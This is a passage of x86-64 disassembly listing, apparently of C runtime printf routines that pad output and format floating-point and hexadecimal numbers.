  406b8d:	83 c7 01             	add    $0x1,%edi
  406b90:	78 ee                	js     0x406b80
  406b92:	e9 97 fe ff ff       	jmp    0x406a2e
  406b97:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  406b9e:	00 00 
  406ba0:	45 85 c0             	test   %r8d,%r8d
  406ba3:	0f 8e 78 fd ff ff    	jle    0x406921
  406ba9:	41 83 e8 01          	sub    $0x1,%r8d
  406bad:	45 89 41 0c          	mov    %r8d,0xc(%r9)
  406bb1:	e9 74 fd ff ff       	jmp    0x40692a
  406bb6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  406bbd:	00 00 00 
  406bc0:	48 89 da             	mov    %rbx,%rdx
  406bc3:	b9 2b 00 00 00       	mov    $0x2b,%ecx
  406bc8:	e8 b3 f3 ff ff       	call   0x405f80
  406bcd:	e9 d0 fd ff ff       	jmp    0x4069a2
  406bd2:	83 ea 01             	sub    $0x1,%edx
  406bd5:	89 53 0c             	mov    %edx,0xc(%rbx)
  406bd8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  406bdf:	00 
  406be0:	48 89 da             	mov    %rbx,%rdx
  406be3:	b9 30 00 00 00       	mov    $0x30,%ecx
  406be8:	e8 93 f3 ff ff       	call   0x405f80
  406bed:	8b 43 0c             	mov    0xc(%rbx),%eax
  406bf0:	8d 50 ff             	lea    -0x1(%rax),%edx
  406bf3:	85 c0                	test   %eax,%eax
  406bf5:	89 53 0c             	mov    %edx,0xc(%rbx)
  406bf8:	7f e6                	jg     0x406be0
  406bfa:	85 ff                	test   %edi,%edi
  406bfc:	bd 56 55 55 55       	mov    $0x55555556,%ebp
  406c01:	4c 8d 63 20          	lea    0x20(%rbx),%r12
  406c05:	0f 8f c5 fd ff ff    	jg     0x4069d0
  406c0b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  406c10:	48 89 da             	mov    %rbx,%rdx
  406c13:	b9 30 00 00 00       	mov    $0x30,%ecx
  406c18:	e8 63 f3 ff ff       	call   0x405f80
  406c1d:	e9 d2 fd ff ff       	jmp    0x4069f4
  406c22:	48 89 da             	mov    %rbx,%rdx
  406c25:	b9 20 00 00 00       	mov    $0x20,%ecx
  406c2a:	e8 51 f3 ff ff       	call   0x405f80
  406c2f:	e9 6e fd ff ff       	jmp    0x4069a2
  406c34:	f6 43 09 08          	testb  $0x8,0x9(%rbx)
  406c38:	0f 84 1f fe ff ff    	je     0x406a5d
  406c3e:	66 90                	xchg   %ax,%ax
  406c40:	e9 09 fd ff ff       	jmp    0x40694e
  406c45:	c7 43 0c 00 00 00 00 	movl   $0x0,0xc(%rbx)
  406c4c:	e9 35 fd ff ff       	jmp    0x406986
  406c51:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
  406c58:	0f 1f 84 00 00 00 00 
  406c5f:	00 
  406c60:	57                   	push   %rdi
  406c61:	56                   	push   %rsi
  406c62:	53                   	push   %rbx
  406c63:	48 83 ec 20          	sub    $0x20,%rsp
  406c67:	41 ba 01 00 00 00    	mov    $0x1,%r10d
  406c6d:	4c 89 cb             	mov    %r9,%rbx
  406c70:	45 8d 48 ff          	lea    -0x1(%r8),%r9d
  406c74:	41 b8 67 66 66 66    	mov    $0x66666667,%r8d
  406c7a:	49 89 d3             	mov    %rdx,%r11
  406c7d:	44 89 c8             	mov    %r9d,%eax
  406c80:	49 63 f1             	movslq %r9d,%rsi
  406c83:	41 c1 f9 1f          	sar    $0x1f,%r9d
  406c87:	41 f7 e8             	imul   %r8d
  406c8a:	c1 fa 02             	sar    $0x2,%edx
  406c8d:	41 89 d0             	mov    %edx,%r8d
  406c90:	45 29 c8             	sub    %r9d,%r8d
  406c93:	74 24                	je     0x406cb9
  406c95:	41 b9 67 66 66 66    	mov    $0x66666667,%r9d
  406c9b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  406ca0:	44 89 c0             	mov    %r8d,%eax
  406ca3:	41 c1 f8 1f          	sar    $0x1f,%r8d
  406ca7:	41 83 c2 01          	add    $0x1,%r10d
  406cab:	41 f7 e9             	imul   %r9d
  406cae:	c1 fa 02             	sar    $0x2,%edx
  406cb1:	44 29 c2             	sub    %r8d,%edx
  406cb4:	41 89 d0             	mov    %edx,%r8d
  406cb7:	75 e7                	jne    0x406ca0
  406cb9:	8b 7b 2c             	mov    0x2c(%rbx),%edi
  406cbc:	8b 53 0c             	mov    0xc(%rbx),%edx
  406cbf:	41 39 fa             	cmp    %edi,%r10d
  406cc2:	41 0f 4d fa          	cmovge %r10d,%edi
  406cc6:	8d 47 02             	lea    0x2(%rdi),%eax
  406cc9:	39 c2                	cmp    %eax,%edx
  406ccb:	7f 53                	jg     0x406d20
  406ccd:	c7 43 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rbx)
  406cd4:	4c 89 da             	mov    %r11,%rdx
  406cd7:	49 89 d9             	mov    %rbx,%r9
  406cda:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  406ce0:	e8 0b fc ff ff       	call   0x4068f0
  406ce5:	8b 4b 08             	mov    0x8(%rbx),%ecx
  406ce8:	8b 43 2c             	mov    0x2c(%rbx),%eax
  406ceb:	48 89 da             	mov    %rbx,%rdx
  406cee:	83 c7 01             	add    $0x1,%edi
  406cf1:	89 43 10             	mov    %eax,0x10(%rbx)
  406cf4:	89 c8                	mov    %ecx,%eax
  406cf6:	83 e1 20             	and    $0x20,%ecx
  406cf9:	0d c0 01 00 00       	or     $0x1c0,%eax
  406cfe:	83 c9 45             	or     $0x45,%ecx
  406d01:	89 43 08             	mov    %eax,0x8(%rbx)
  406d04:	e8 77 f2 ff ff       	call   0x405f80
  406d09:	01 7b 0c             	add    %edi,0xc(%rbx)
  406d0c:	48 89 da             	mov    %rbx,%rdx
  406d0f:	48 89 f1             	mov    %rsi,%rcx
  406d12:	e8 19 f5 ff ff       	call   0x406230
  406d17:	90                   	nop
  406d18:	48 83 c4 20          	add    $0x20,%rsp
  406d1c:	5b                   	pop    %rbx
  406d1d:	5e                   	pop    %rsi
  406d1e:	5f                   	pop    %rdi
  406d1f:	c3                   	ret
  406d20:	29 c2                	sub    %eax,%edx
  406d22:	89 53 0c             	mov    %edx,0xc(%rbx)
  406d25:	eb ad                	jmp    0x406cd4
  406d27:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  406d2e:	00 00 
  406d30:	56                   	push   %rsi
  406d31:	53                   	push   %rbx
  406d32:	48 83 ec 68          	sub    $0x68,%rsp
  406d36:	44 8b 42 10          	mov    0x10(%rdx),%r8d
  406d3a:	db 29                	fldt   (%rcx)
  406d3c:	48 89 d3             	mov    %rdx,%rbx
  406d3f:	45 85 c0             	test   %r8d,%r8d
  406d42:	0f 88 98 00 00 00    	js     0x406de0
  406d48:	db 7c 24 50          	fstpt  0x50(%rsp)
  406d4c:	4c 8d 4c 24 4c       	lea    0x4c(%rsp),%r9
  406d51:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
  406d56:	b9 03 00 00 00       	mov    $0x3,%ecx
  406d5b:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
  406d60:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  406d65:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
  406d6a:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
  406d6f:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
  406d74:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  406d79:	e8 32 f1 ff ff       	call   0x405eb0
  406d7e:	44 8b 44 24 4c       	mov    0x4c(%rsp),%r8d
  406d83:	48 89 c6             	mov    %rax,%rsi
  406d86:	41 81 f8 00 80 ff ff 	cmp    $0xffff8000,%r8d
  406d8d:	74 63                	je     0x406df2
  406d8f:	8b 4c 24 48          	mov    0x48(%rsp),%ecx
  406d93:	48 89 c2             	mov    %rax,%rdx
  406d96:	49 89 d9             	mov    %rbx,%r9
  406d99:	e8 52 fb ff ff       	call   0x4068f0
  406d9e:	8b 43 0c             	mov    0xc(%rbx),%eax
  406da1:	8d 50 ff             	lea    -0x1(%rax),%edx
  406da4:	85 c0                	test   %eax,%eax
  406da6:	89 53 0c             	mov    %edx,0xc(%rbx)
  406da9:	7e 23                	jle    0x406dce
  406dab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  406db0:	48 89 da             	mov    %rbx,%rdx
  406db3:	b9 20 00 00 00       	mov    $0x20,%ecx
  406db8:	e8 c3 f1 ff ff       	call   0x405f80
  406dbd:	44 8b 43 0c          	mov    0xc(%rbx),%r8d
  406dc1:	45 8d 48 ff          	lea    -0x1(%r8),%r9d
  406dc5:	45 85 c0             	test   %r8d,%r8d
  406dc8:	44 89 4b 0c          	mov    %r9d,0xc(%rbx)
  406dcc:	7f e2                	jg     0x406db0
  406dce:	48 89 f1             	mov    %rsi,%rcx
  406dd1:	e8 ba 2b 00 00       	call   0x409990
  406dd6:	90                   	nop
  406dd7:	48 83 c4 68          	add    $0x68,%rsp
  406ddb:	5b                   	pop    %rbx
  406ddc:	5e                   	pop    %rsi
  406ddd:	c3                   	ret
  406dde:	66 90                	xchg   %ax,%ax
  406de0:	c7 42 10 06 00 00 00 	movl   $0x6,0x10(%rdx)
  406de7:	41 b8 06 00 00 00    	mov    $0x6,%r8d
  406ded:	e9 56 ff ff ff       	jmp    0x406d48
  406df2:	8b 4c 24 48          	mov    0x48(%rsp),%ecx
  406df6:	49 89 d8             	mov    %rbx,%r8
  406df9:	48 89 c2             	mov    %rax,%rdx
  406dfc:	e8 8f f3 ff ff       	call   0x406190
  406e01:	48 89 f1             	mov    %rsi,%rcx
  406e04:	e8 87 2b 00 00       	call   0x409990
  406e09:	90                   	nop
  406e0a:	48 83 c4 68          	add    $0x68,%rsp
  406e0e:	5b                   	pop    %rbx
  406e0f:	5e                   	pop    %rsi
  406e10:	c3                   	ret
  406e11:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
  406e18:	0f 1f 84 00 00 00 00 
  406e1f:	00 
  406e20:	56                   	push   %rsi
  406e21:	53                   	push   %rbx
  406e22:	48 83 ec 78          	sub    $0x78,%rsp
  406e26:	44 8b 42 10          	mov    0x10(%rdx),%r8d
  406e2a:	db 29                	fldt   (%rcx)
  406e2c:	48 89 d3             	mov    %rdx,%rbx
  406e2f:	41 83 f8 00          	cmp    $0x0,%r8d
  406e33:	0f 8c 37 01 00 00    	jl     0x406f70
  406e39:	0f 84 11 01 00 00    	je     0x406f50
  406e3f:	db 7c 24 60          	fstpt  0x60(%rsp)
  406e43:	4c 8d 4c 24 5c       	lea    0x5c(%rsp),%r9
  406e48:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
  406e4d:	b9 02 00 00 00       	mov    $0x2,%ecx
  406e52:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
  406e57:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
  406e5c:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
  406e61:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
  406e66:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
  406e6b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  406e70:	e8 3b f0 ff ff       	call   0x405eb0
  406e75:	44 8b 44 24 5c       	mov    0x5c(%rsp),%r8d
  406e7a:	48 89 c6             	mov    %rax,%rsi
  406e7d:	41 81 f8 00 80 ff ff 	cmp    $0xffff8000,%r8d
  406e84:	0f 84 06 01 00 00    	je     0x406f90
  406e8a:	41 83 f8 fd          	cmp    $0xfffffffd,%r8d
  406e8e:	0f 8c 7c 00 00 00    	jl     0x406f10
  406e94:	8b 43 10             	mov    0x10(%rbx),%eax
  406e97:	41 39 c0             	cmp    %eax,%r8d
  406e9a:	7f 74                	jg     0x406f10
  406e9c:	f6 43 09 08          	testb  $0x8,0x9(%rbx)
  406ea0:	0f 85 dc 00 00 00    	jne    0x406f82
  406ea6:	48 89 f1             	mov    %rsi,%rcx
  406ea9:	44 89 44 24 38       	mov    %r8d,0x38(%rsp)
  406eae:	e8 25 3a 00 00       	call   0x40a8d8
  406eb3:	44 8b 44 24 38       	mov    0x38(%rsp),%r8d
  406eb8:	44 29 c0             	sub    %r8d,%eax
  406ebb:	85 c0                	test   %eax,%eax
  406ebd:	89 43 10             	mov    %eax,0x10(%rbx)
  406ec0:	0f 88 db 00 00 00    	js     0x406fa1
  406ec6:	8b 4c 24 58          	mov    0x58(%rsp),%ecx
  406eca:	48 89 f2             	mov    %rsi,%rdx
  406ecd:	49 89 d9             	mov    %rbx,%r9
  406ed0:	e8 1b fa ff ff       	call   0x4068f0
  406ed5:	8b 43 0c             	mov    0xc(%rbx),%eax
  406ed8:	8d 50 ff             	lea    -0x1(%rax),%edx
  406edb:	85 c0                	test   %eax,%eax
  406edd:	89 53 0c             	mov    %edx,0xc(%rbx)
  406ee0:	7e 5b                	jle    0x406f3d
  406ee2:	48 89 da             	mov    %rbx,%rdx
  406ee5:	b9 20 00 00 00       	mov    $0x20,%ecx
  406eea:	e8 91 f0 ff ff       	call   0x405f80
  406eef:	44 8b 43 0c          	mov    0xc(%rbx),%r8d
  406ef3:	45 8d 48 ff          	lea    -0x1(%r8),%r9d
  406ef7:	45 85 c0             	test   %r8d,%r8d
  406efa:	44 89 4b 0c          	mov    %r9d,0xc(%rbx)
  406efe:	7f e2                	jg     0x406ee2
  406f00:	48 89 f1             	mov    %rsi,%rcx
  406f03:	e8 88 2a 00 00       	call   0x409990
  406f08:	90                   	nop
  406f09:	48 83 c4 78          	add    $0x78,%rsp
  406f0d:	5b                   	pop    %rbx
  406f0e:	5e                   	pop    %rsi
  406f0f:	c3                   	ret
  406f10:	f6 43 09 08          	testb  $0x8,0x9(%rbx)
  406f14:	75 4c                	jne    0x406f62
  406f16:	48 89 f1             	mov    %rsi,%rcx
  406f19:	44 89 44 24 38       	mov    %r8d,0x38(%rsp)
  406f1e:	e8 b5 39 00 00       	call   0x40a8d8
  406f23:	44 8b 44 24 38       	mov    0x38(%rsp),%r8d
  406f28:	83 e8 01             	sub    $0x1,%eax
  406f2b:	89 43 10             	mov    %eax,0x10(%rbx)
  406f2e:	8b 4c 24 58          	mov    0x58(%rsp),%ecx
  406f32:	49 89 d9             	mov    %rbx,%r9
  406f35:	48 89 f2             	mov    %rsi,%rdx
  406f38:	e8 23 fd ff ff       	call   0x406c60
  406f3d:	48 89 f1             	mov    %rsi,%rcx
  406f40:	e8 4b 2a 00 00       	call   0x409990
  406f45:	90                   	nop
  406f46:	48 83 c4 78          	add    $0x78,%rsp
  406f4a:	5b                   	pop    %rbx
  406f4b:	5e                   	pop    %rsi
  406f4c:	c3                   	ret
  406f4d:	0f 1f 00             	nopl   (%rax)
  406f50:	c7 42 10 01 00 00 00 	movl   $0x1,0x10(%rdx)
  406f57:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  406f5d:	e9 dd fe ff ff       	jmp    0x406e3f
  406f62:	83 6b 10 01          	subl   $0x1,0x10(%rbx)
  406f66:	eb c6                	jmp    0x406f2e
  406f68:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  406f6f:	00 
  406f70:	c7 42 10 06 00 00 00 	movl   $0x6,0x10(%rdx)
  406f77:	41 b8 06 00 00 00    	mov    $0x6,%r8d
  406f7d:	e9 bd fe ff ff       	jmp    0x406e3f
  406f82:	44 29 c0             	sub    %r8d,%eax
  406f85:	89 43 10             	mov    %eax,0x10(%rbx)
  406f88:	e9 39 ff ff ff       	jmp    0x406ec6
  406f8d:	0f 1f 00             	nopl   (%rax)
  406f90:	8b 4c 24 58          	mov    0x58(%rsp),%ecx
  406f94:	49 89 d8             	mov    %rbx,%r8
  406f97:	48 89 c2             	mov    %rax,%rdx
  406f9a:	e8 f1 f1 ff ff       	call   0x406190
  406f9f:	eb 9c                	jmp    0x406f3d
  406fa1:	8b 53 0c             	mov    0xc(%rbx),%edx
  406fa4:	85 d2                	test   %edx,%edx
  406fa6:	0f 8e 1a ff ff ff    	jle    0x406ec6
  406fac:	01 d0                	add    %edx,%eax
  406fae:	89 43 0c             	mov    %eax,0xc(%rbx)
  406fb1:	e9 10 ff ff ff       	jmp    0x406ec6
  406fb6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  406fbd:	00 00 00 
  406fc0:	41 55                	push   %r13
  406fc2:	41 54                	push   %r12
  406fc4:	55                   	push   %rbp
  406fc5:	57                   	push   %rdi
  406fc6:	56                   	push   %rsi
  406fc7:	53                   	push   %rbx
  406fc8:	48 83 ec 68          	sub    $0x68,%rsp
  406fcc:	db 29                	fldt   (%rcx)
  406fce:	48 89 d3             	mov    %rdx,%rbx
  406fd1:	d9 c0                	fld    %st(0)
  406fd3:	db 7c 24 30          	fstpt  0x30(%rsp)
  406fd7:	d9 e5                	fxam
  406fd9:	9b df e0             	fstsw  %ax
  406fdc:	66 25 00 45          	and    $0x4500,%ax
  406fe0:	66 3d 00 01          	cmp    $0x100,%ax
  406fe4:	0f 84 9e 03 00 00    	je     0x407388
  406fea:	0f b7 7c 24 38       	movzwl 0x38(%rsp),%edi
  406fef:	89 f9                	mov    %edi,%ecx
  406ff1:	81 e1 00 80 00 00    	and    $0x8000,%ecx
  406ff7:	0f 85 23 01 00 00    	jne    0x407120
  406ffd:	d9 e5                	fxam
  406fff:	9b df e0             	fstsw  %ax
  407002:	dd d8                	fstp   %st(0)
  407004:	66 25 00 45          	and    $0x4500,%ax
  407008:	66 3d 00 05          	cmp    $0x500,%ax
  40700c:	0f 84 8e 03 00 00    	je     0x4073a0
  407012:	66 81 e7 ff 7f       	and    $0x7fff,%di
  407017:	0f 84 13 01 00 00    	je     0x407130
  40701d:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
  407022:	66 81 ef ff 3f       	sub    $0x3fff,%di
  407027:	8b 53 10             	mov    0x10(%rbx),%edx
  40702a:	83 fa 0e             	cmp    $0xe,%edx
  40702d:	77 39                	ja     0x407068
  40702f:	48 85 c0             	test   %rax,%rax
  407032:	78 05                	js     0x407039
  407034:	48 01 c0             	add    %rax,%rax
  407037:	79 fb                	jns    0x407034
  407039:	b9 0e 00 00 00       	mov    $0xe,%ecx
  40703e:	41 b8 04 00 00 00    	mov    $0x4,%r8d
  407044:	48 d1 e8             	shr    $1,%rax
  407047:	29 d1                	sub    %edx,%ecx
  407049:	c1 e1 02             	shl    $0x2,%ecx
  40704c:	49 d3 e0             	shl    %cl,%r8
  40704f:	4c 01 c0             	add    %r8,%rax
  407052:	0f 88 28 03 00 00    	js     0x407380
  407058:	48 01 c0             	add    %rax,%rax
  40705b:	b9 0f 00 00 00       	mov    $0xf,%ecx
  407060:	29 d1                	sub    %edx,%ecx
  407062:	c1 e1 02             	shl    $0x2,%ecx
  407065:	48 d3 e8             	shr    %cl,%rax
  407068:	48 85 c0             	test   %rax,%rax
  40706b:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
  407070:	0f 84 3e 03 00 00    	je     0x4073b4
  407076:	44 8b 4b 08          	mov    0x8(%rbx),%r9d
  40707a:	48 89 ee             	mov    %rbp,%rsi
  40707d:	45 89 cb             	mov    %r9d,%r11d
  407080:	45 89 ca             	mov    %r9d,%r10d
  407083:	41 81 e3 00 08 00 00 	and    $0x800,%r11d
  40708a:	41 83 e2 20          	and    $0x20,%r10d
  40708e:	eb 31                	jmp    0x4070c1
  407090:	8b 53 10             	mov    0x10(%rbx),%edx
  407093:	85 d2                	test   %edx,%edx
  407095:	7e 06                	jle    0x40709d
  407097:	83 ea 01             	sub    $0x1,%edx
  40709a:	89 53 10             	mov    %edx,0x10(%rbx)
  40709d:	48 c1 e8 04          	shr    $0x4,%rax
  4070a1:	85 c9                	test   %ecx,%ecx
  4070a3:	74 62                	je     0x407107
  4070a5:	83 f9 09             	cmp    $0x9,%ecx
  4070a8:	7e 6b                	jle    0x407115
  4070aa:	41 83 c0 37          	add    $0x37,%r8d
  4070ae:	45 09 d0             	or     %r10d,%r8d
  4070b1:	44 88 06             	mov    %r8b,(%rsi)
  4070b4:	48 83 c6 01          	add    $0x1,%rsi
  4070b8:	48 85 c0             	test   %rax,%rax
  4070bb:	0f 84 9f 00 00 00    	je     0x407160
  4070c1:	49 89 c0             	mov    %rax,%r8
  4070c4:	41 83 e0 0f          	and    $0xf,%r8d
  4070c8:	41 39 c0             	cmp    %eax,%r8d
  4070cb:	44 89 c1             	mov    %r8d,%ecx
  4070ce:	75 c0                	jne    0x407090
  4070d0:	48 39 ee             	cmp    %rbp,%rsi
  4070d3:	77 0e                	ja     0x4070e3
  4070d5:	45 85 db             	test   %r11d,%r11d
  4070d8:	75 09                	jne    0x4070e3
  4070da:	44 8b 6b 10          	mov    0x10(%rbx),%r13d
  4070de:	45 85 ed             	test   %r13d,%r13d
  4070e1:	7e 07                	jle    0x4070ea
  4070e3:	c6 06 2e             	movb   $0x2e,(%rsi)
  4070e6:	48 83 c6 01          	add    $0x1,%rsi
  4070ea:	48 83 f8 01          	cmp    $0x1,%rax
  4070ee:	76 11                	jbe    0x407101
  4070f0:	8d 57 ff             	lea    -0x1(%rdi),%edx
  4070f3:	48 d1 e8             	shr    $1,%rax
  4070f6:	89 d7                	mov    %edx,%edi
  4070f8:	48 83 f8 01          	cmp    $0x1,%rax
  4070fc:	8d 57 ff             	lea    -0x1(%rdi),%edx
  4070ff:	77 f2                	ja     0x4070f3
  407101:	31 c0                	xor    %eax,%eax
  407103:	85 c9                	test   %ecx,%ecx
  407105:	75 9e                	jne    0x4070a5
  407107:	48 39 ee             	cmp    %rbp,%rsi
  40710a:	77 09                	ja     0x407115
  40710c:	44 8b 63 10          	mov    0x10(%rbx),%r12d
  407110:	45 85 e4             	test   %r12d,%r12d
  407113:	78 a3                	js     0x4070b8
  407115:	41 83 c0 30          	add    $0x30,%r8d
  407119:	eb 96                	jmp    0x4070b1
  40711b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  407120:	81 4a 08 80 00 00 00 	orl    $0x80,0x8(%rdx)
  407127:	e9 d1 fe ff ff       	jmp    0x406ffd
  40712c:	0f 1f 40 00          	nopl   0x0(%rax)
  407130:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
  407135:	31 ff                	xor    %edi,%edi
  407137:	48 83 f8 00          	cmp    $0x0,%rax
  40713b:	0f 84 e6 fe ff ff    	je     0x407027
  407141:	bf 02 c0 ff ff       	mov    $0xffffc002,%edi
  407146:	0f 8c db fe ff ff    	jl     0x407027
  40714c:	ba 01 c0 ff ff       	mov    $0xffffc001,%edx
  407151:	89 d7                	mov    %edx,%edi
  407153:	83 ea 01             	sub    $0x1,%edx
  407156:	48 01 c0             	add    %rax,%rax
  407159:	79 f6                	jns    0x407151
  40715b:	e9 c7 fe ff ff       	jmp    0x407027
  407160:	48 39 ee             	cmp    %rbp,%rsi
  407163:	0f 84 6b 02 00 00    	je     0x4073d4
  407169:	45 89 ca             	mov    %r9d,%r10d
  40716c:	44 8b 5b 0c          	mov    0xc(%rbx),%r11d
  407170:	41 bc 02 00 00 00    	mov    $0x2,%r12d
  407176:	45 85 db             	test   %r11d,%r11d
  407179:	0f 8e a3 00 00 00    	jle    0x407222
  40717f:	8b 43 10             	mov    0x10(%rbx),%eax
  407182:	89 f2                	mov    %esi,%edx
  407184:	44 0f bf ef          	movswl %di,%r13d
  407188:	29 ea                	sub    %ebp,%edx
  40718a:	8d 0c 02             	lea    (%rdx,%rax,1),%ecx
  40718d:	85 c0                	test   %eax,%eax
  40718f:	44 89 c8             	mov    %r9d,%eax
  407192:	0f 4f d1             	cmovg  %ecx,%edx
  407195:	25 c0 01 00 00       	and    $0x1c0,%eax
  40719a:	83 f8 01             	cmp    $0x1,%eax
  40719d:	19 c0                	sbb    %eax,%eax
  40719f:	44 8d 44 02 06       	lea    0x6(%rdx,%rax,1),%r8d
  4071a4:	44 89 e8             	mov    %r13d,%eax
  4071a7:	ba 67 66 66 66       	mov    $0x66666667,%edx
  4071ac:	f7 ea                	imul   %edx
  4071ae:	41 c1 fd 1f          	sar    $0x1f,%r13d
  4071b2:	c1 fa 02             	sar    $0x2,%edx
  4071b5:	89 d1                	mov    %edx,%ecx
  4071b7:	44 29 e9             	sub    %r13d,%ecx
  4071ba:	74 23                	je     0x4071df
  4071bc:	41 bd 67 66 66 66    	mov    $0x66666667,%r13d
  4071c2:	89 c8                	mov    %ecx,%eax
  4071c4:	c1 f9 1f             	sar    $0x1f,%ecx
  4071c7:	41 83 c0 01          	add    $0x1,%r8d
  4071cb:	41 f7 ed             	imul   %r13d
  4071ce:	41 83 c4 01          	add    $0x1,%r12d
  4071d2:	c1 fa 02             	sar    $0x2,%edx
  4071d5:	29 ca                	sub    %ecx,%edx
  4071d7:	89 d1                	mov    %edx,%ecx
  4071d9:	75 e7                	jne    0x4071c2
  4071db:	45 0f bf e4          	movswl %r12w,%r12d
  4071df:	45 39 c3             	cmp    %r8d,%r11d
  4071e2:	0f 8e 48 01 00 00    	jle    0x407330
  4071e8:	45 29 c3             	sub    %r8d,%r11d
  4071eb:	41 81 e1 00 06 00 00 	and    $0x600,%r9d
  4071f2:	0f 85 5b 01 00 00    	jne    0x407353
  4071f8:	41 8d 43 ff          	lea    -0x1(%r11),%eax
  4071fc:	45 85 db             	test   %r11d,%r11d
  4071ff:	89 43 0c             	mov    %eax,0xc(%rbx)
  407202:	7e 1e                	jle    0x407222
  407204:	48 89 da             	mov    %rbx,%rdx
  407207:	b9 20 00 00 00       	mov    $0x20,%ecx
  40720c:	e8 6f ed ff ff       	call   0x405f80
  407211:	8b 43 0c             	mov    0xc(%rbx),%eax
  407214:	8d 50 ff             	lea    -0x1(%rax),%edx
  407217:	85 c0                	test   %eax,%eax
  407219:	89 53 0c             	mov    %edx,0xc(%rbx)
  40721c:	7f e6                	jg     0x407204
  40721e:	44 8b 53 08          	mov    0x8(%rbx),%r10d
  407222:	41 f6 c2 80          	test   $0x80,%r10b
  407226:	0f 85 15 01 00 00    	jne    0x407341
  40722c:	41 f7 c2 00 01 00 00 	test   $0x100,%r10d
  407233:	0f 85 23 01 00 00    	jne    0x40735c
  407239:	41 83 e2 40          	and    $0x40,%r10d
  40723d:	0f 85 2b 01 00 00    	jne    0x40736e
  407243:	48 89 da             	mov    %rbx,%rdx
  407246:	b9 30 00 00 00       	mov    $0x30,%ecx
  40724b:	e8 30 ed ff ff       	call   0x405f80
  407250:	8b 4b 08             	mov    0x8(%rbx),%ecx
  407253:	48 89 da             	mov    %rbx,%rdx
  407256:	83 e1 20             	and    $0x20,%ecx
  407259:	83 c9 58             	or     $0x58,%ecx
  40725c:	e8 1f ed ff ff       	call   0x405f80
  407261:	8b 43 0c             	mov    0xc(%rbx),%eax
  407264:	85 c0                	test   %eax,%eax
  407266:	7e 26                	jle    0x40728e
  407268:	f6 43 09 02          	testb  $0x2,0x9(%rbx)
  40726c:	74 20                	je     0x40728e
  40726e:	83 e8 01             	sub    $0x1,%eax
  407271:	89 43 0c             	mov    %eax,0xc(%rbx)
  407274:	48 89 da             	mov    %rbx,%rdx
  407277:	b9 30 00 00 00       	mov    $0x30,%ecx
  40727c:	e8 ff ec ff ff       	call   0x405f80
  407281:	8b 43 0c             	mov    0xc(%rbx),%eax
  407284:	8d 50 ff             	lea    -0x1(%rax),%edx
  407287:	85 c0                	test   %eax,%eax
  407289:	89 53 0c             	mov    %edx,0xc(%rbx)
  40728c:	7f e6                	jg     0x407274
  40728e:	48 39 ee             	cmp    %rbp,%rsi
  407291:	77 27                	ja     0x4072ba
  407293:	eb 4d                	jmp    0x4072e2
  407295:	0f b7 43 20          	movzwl 0x20(%rbx),%eax
  407299:	66 85 c0             	test   %ax,%ax
  40729c:	66 89 44 24 2e       	mov    %ax,0x2e(%rsp)
  4072a1:	74 12                	je     0x4072b5
  4072a3:	48 8d 4c 24 2e       	lea    0x2e(%rsp),%rcx
  4072a8:	49 89 d8             	mov    %rbx,%r8
  4072ab:	ba 01 00 00 00       	mov    $0x1,%edx
  4072b0:	e8 2b ed ff ff       	call   0x405fe0
  4072b5:	48 39 ee             	cmp    %rbp,%rsi
  4072b8:	74 28                	je     0x4072e2
  4072ba:	48 83 ee 01          	sub    $0x1,%rsi
  4072be:	0f be 0e             	movsbl (%rsi),%ecx
  4072c1:	83 f9 2e             	cmp    $0x2e,%ecx
  4072c4:	74 5f                	je     0x407325
  4072c6:	83 f9 2c             	cmp    $0x2c,%ecx
  4072c9:	74 ca                	je     0x407295
  4072cb:	48 89 da             	mov    %rbx,%rdx
  4072ce:	e8 ad ec ff ff       	call   0x405f80
  4072d3:	eb e0                	jmp    0x4072b5
  4072d5:	48 89 da             	mov    %rbx,%rdx
  4072d8:	b9 30 00 00 00       	mov    $0x30,%ecx
  4072dd:	e8 9e ec ff ff       	call   0x405f80
  4072e2:	8b 43 10             	mov    0x10(%rbx),%eax
  4072e5:	8d 50 ff             	lea    -0x1(%rax),%edx
  4072e8:	85 c0                	test   %eax,%eax
  4072ea:	89 53 10             	mov    %edx,0x10(%rbx)
  4072ed:	7f e6                	jg     0x4072d5
  4072ef:	8b 4b 08             	mov    0x8(%rbx),%ecx
  4072f2:	48 89 da             	mov    %rbx,%rdx
  4072f5:	83 e1 20             	and    $0x20,%ecx
  4072f8:	83 c9 50             	or     $0x50,%ecx
  4072fb:	e8 80 ec ff ff       	call   0x405f80
  407300:	44 01 63 0c          	add    %r12d,0xc(%rbx)
  407304:	81 4b 08 c0 01 00 00 	orl    $0x1c0,0x8(%rbx)
  40730b:	48 0f bf cf          	movswq %di,%rcx
  40730f:	48 89 da             	mov    %rbx,%rdx
